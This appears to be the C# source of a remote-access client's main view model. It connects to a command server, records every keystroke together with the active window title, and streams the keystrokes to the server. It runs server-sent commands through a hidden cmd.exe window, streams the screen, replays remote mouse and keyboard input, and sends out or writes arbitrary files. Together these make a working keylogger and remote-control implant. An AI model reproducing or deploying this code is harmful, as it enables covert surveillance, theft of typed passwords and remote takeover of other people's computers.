using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Avalonia.Threading;
using DotNetEnv;
using CLIENT.Helpers;
using System.Speech.Synthesis;
using System.Threading;
using System.IO;
using Avalonia.Controls.Documents;

namespace CLIENT.ViewModels
{
    public partial class MainWindowViewModel : ViewModelBase
    {

        
        private TcpClient _client;
        private NetworkStream _stream;
        private SpeechSynthesizer _synth;
        private bool _speak;

        public MainWindowViewModel()
        {
            DotNetEnv.Env.Load();
            _synth = new SpeechSynthesizer();
            _synth.SetOutputToDefaultAudioDevice();
            _ = ConnectToServerAsync();
        }

        private async Task ConnectToServerAsync()
        {
            string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
            int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
            string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";
            _speak = bool.TryParse(Environment.GetEnvironmentVariable("SPEAK"), out bool speakValue) ? speakValue : false;


            _synth.SetOutputToDefaultAudioDevice();
            

            KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
            {
                if (_client == null || !_client.Connected) return;

                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string windowInfo = WindowDetector.GetActiveWindowInfo();
                if(_speak) { 
                    _synth.SpeakAsyncCancelAll();
                    _synth.SpeakAsync($"You pressed {key}");
                }
                AppendMessageToLogAsync($"[{timestamp}] : Key: {key}, {windowInfo}");
            };
            KeyboardDetector.Start();

            MouseDetector.OnMouseHoverRead += (content) =>
            {
                if (_speak) { 
                    _synth.SpeakAsyncCancelAll();
                    _synth.SpeakAsync($"Content at mouse position: {content}");
                }
            };
            MouseDetector.Start();

            while (true)
            {
                try
                {
               
                    if (_client == null || !_client.Connected)
                    {
                        _client = new TcpClient();
                        await _client.ConnectAsync(serverIp, port);
                        _stream = _client.GetStream();

                        // Send initial machine name
                        string clientMessage = $"Machine - {Environment.MachineName}";
                        byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
                        await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);

                        KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
                        {
                            string windowInfo = WindowDetector.GetActiveWindowInfo();
                            await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
                        };

                        // Start listening
                        _ = ListenToServerAsync();

                        break; // Exit the reconnect loop after successful connection
                    }

                }
                catch (Exception ex)
                {
                    await Task.Delay(3000); // wait before retrying
                }
            }
        }


        private async Task ListenToServerAsync()
        {
            try
            {
                // Use a larger buffer so commands are never split mid-message
                var buffer = new byte[8192];

                while (_client != null && _client.Connected)
                {
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;

                    string serverMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    // ── Remote input: handle immediately on a thread-pool thread
                    //    (NOT the UI thread) so SendInput is never blocked.
                    if (serverMessage.StartsWith("input:mouse:"))
                    {
                        string payload = serverMessage.Substring(12).Trim();
                        _ = Task.Run(() => RemoteInput.ReplayMouse(payload));
                        continue;
                    }

                    if (serverMessage.StartsWith("input:key:"))
                    {
                        string payload = serverMessage.Substring(10).Trim();
                        _ = Task.Run(() => RemoteInput.ReplayKey(payload));
                        continue;
                    }

                    // ── All other commands go to the UI thread
                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        if (serverMessage.StartsWith("__upload_file:"))
                        {
                            string command = serverMessage.Substring(14).Trim();
                            UploadFile(command);
                        }
                        else if (serverMessage.StartsWith("__download_file:"))
                        {
                            string command = serverMessage.Substring(16).Trim();
                            DownloadTargetFile(command);
                        }
                        else if (serverMessage.StartsWith("__open_file:"))
                        {
                            string command = serverMessage.Substring(12).Trim();
                            SendFilePath(command);
                        }
                        else if (serverMessage.StartsWith("__screen_start"))
                        {
                            ScreenCapture.Start(_stream, fps: 10);
                        }
                        else if (serverMessage.StartsWith("__screen_stop"))
                        {
                            ScreenCapture.Stop();
                        }
                        else if (serverMessage.StartsWith("cmd:"))
                        {
                            string command = serverMessage.Substring(4).Trim();
                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Executing: {command}");
                            _ = Task.Run(async () =>
                            {
                                try
                                {
                                    var processStartInfo = new ProcessStartInfo()
                                    {
                                        FileName = "cmd.exe",
                                        Arguments = $"/c {command}",
                                        RedirectStandardOutput = true,
                                        RedirectStandardError = true,
                                        UseShellExecute = false,
                                        CreateNoWindow = true
                                    };
                                    using (Process process = Process.Start(processStartInfo))
                                    {
                                        if (process != null)
                                        {
                                            string output = await process.StandardOutput.ReadToEndAsync();
                                            string error = await process.StandardError.ReadToEndAsync();
                                            await process.WaitForExitAsync();

                                            string result = string.IsNullOrEmpty(output) ? error : output;
                                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Result: {result?.Trim()}");
                                            if (!string.IsNullOrEmpty(result))
                                                await SendKeyLoggerAsync($"cmd_output:{result}");
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [CMD] Error: {ex.Message}");
                                    await SendKeyLoggerAsync($"cmd_output:Error: {ex.Message}");
                                }
                            });
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ListenToServerAsync error: {ex.Message}");
            }

            // Reconnect on disconnect
            _client?.Close();
            _client = null;
            _stream = null;

            await ConnectToServerAsync();
        }


        public async Task SendKeyLoggerAsync(string appName)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string message = $"{appName}";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
               
                }
            }
            catch (Exception ex)
            {
            }
        }
        public async Task SendAppInfoAsync(string appName)
        {
            if (_speak)
            {
                _synth.SpeakAsyncCancelAll();
                _synth.SpeakAsync($"You clicked {appName}");
            }
           
            string message = $"Clicked: {appName}";
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            AppendMessageToLogAsync($"[{timestamp}] : {message}");
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
                }
            }
            catch (Exception ex)
            {
            }
        }

        public async Task DownloadTargetFile(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string response;

                    // Check if the command is a valid file path
                    if (!string.IsNullOrEmpty(command) && File.Exists(command))
                    {
                        try
                        {
                            // Read file content
                            byte[] fileBytes = await File.ReadAllBytesAsync(command);

                            // Send file metadata (header)
                            string header = $"fileDownload:{Path.GetFileName(command)}:{fileBytes.Length}\n";
                            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                            await _stream.WriteAsync(headerBytes, 0, headerBytes.Length);

                            // Send file content
                            await _stream.WriteAsync(fileBytes, 0, fileBytes.Length);

                            // Flush the stream
                            await _stream.FlushAsync();

                            response = $"File '{Path.GetFileName(command)}' successfully sent to the server.";
                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Sent file '{Path.GetFileName(command)}' ({fileBytes.Length} bytes) to server.");
                        }
                        catch (IOException ioEx)
                        {
                            response = $"File access error: {ioEx.Message}";
                            AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] File access error for '{command}': {ioEx.Message}");
                        }
                    }
                    else
                    {
                        response = "Invalid or non-existent file path.";
                        AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Invalid or non-existent file path: '{command}'");
                    }
                }
                else
                {
                    throw new InvalidOperationException("The client is not connected to the server.");
                }
            }
            catch (Exception ex)
            {
                AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [DOWNLOAD] Error: {ex.Message}");
            }
        }

        public async Task UploadFile(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    // Protocol: "<destFolder>:<name>:<size>"
                    // destFolder may contain colons (e.g. C:\...) so split from the right.
                    int lastColon  = command.LastIndexOf(':');
                    int secondLast = lastColon > 0 ? command.LastIndexOf(':', lastColon - 1) : -1;

                    if (lastColon > 0 && secondLast > 0
                        && int.TryParse(command.Substring(lastColon + 1), out int fileSize))
                    {
                        string destFolder = command.Substring(0, secondLast);
                        string fileName   = command.Substring(secondLast + 1, lastColon - secondLast - 1);

                        NetworkStream clientStream = _client.GetStream();

                        byte[] buffer = new byte[fileSize];
                        int totalBytesRead = 0;
                        int bytesRead;

                        while (totalBytesRead < fileSize &&
                               (bytesRead = clientStream.Read(buffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
                        {
                            totalBytesRead += bytesRead;
                        }

                        // Save to the destination folder specified by the admin
                        Directory.CreateDirectory(destFolder);
                        string savePath = Path.Combine(destFolder, fileName);
                        File.WriteAllBytes(savePath, buffer);
                        AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [UPLOAD] Received file '{fileName}' ({totalBytesRead} bytes) saved to '{savePath}'.");
                    }
                }
                else
                {
                    throw new InvalidOperationException("The client is not connected to the server.");
                }
            }
            catch (Exception ex)
            {
                AppendMessageToLogAsync($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [UPLOAD] Error: {ex.Message}");
                Console.WriteLine($"UploadFile error: {ex.Message}");
            }
        }

        public async Task SendFilePath(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string response = string.Empty;

                    string path = !string.IsNullOrEmpty(command) ? command : "C:/";
                    if (Directory.Exists(path))
                    {
                        var entries = Directory.GetFileSystemEntries(path);
                        response = "pathlist:\n" + string.Join("\n", entries);
                    }
                    else
                    {
                        response = "Invalid directory path.";
                    }
                    byte[] responseBytes = Encoding.UTF8.GetBytes(response);
                    await _stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                }
            }
            catch (Exception ex)
            {
            }
        }
        public void AppendMessageToLogAsync(string message)
        {
            try
            {
                // Get today's date string in yyyymmdd format
                string dateStr = DateTime.Now.ToString("yyyyMMdd");

                // Build file path (adjust folder as needed)
                string logFileName = $"log-{dateStr}.txt";
                string logFolder = "logs";  // e.g., a "logs" folder in your app directory
                Directory.CreateDirectory(logFolder); // ensure folder exists

                string logFilePath = Path.Combine(logFolder, logFileName);

                // Prepare the line to write (timestamp + message)
                string line = $"{message}{Environment.NewLine}";

                File.AppendAllText(logFilePath, line);

            }
            catch (Exception ex)
            {
                // Handle exceptions as needed (log or show error)
                Console.WriteLine($"Failed to write log: {ex.Message}");
            }
        }

    }
}
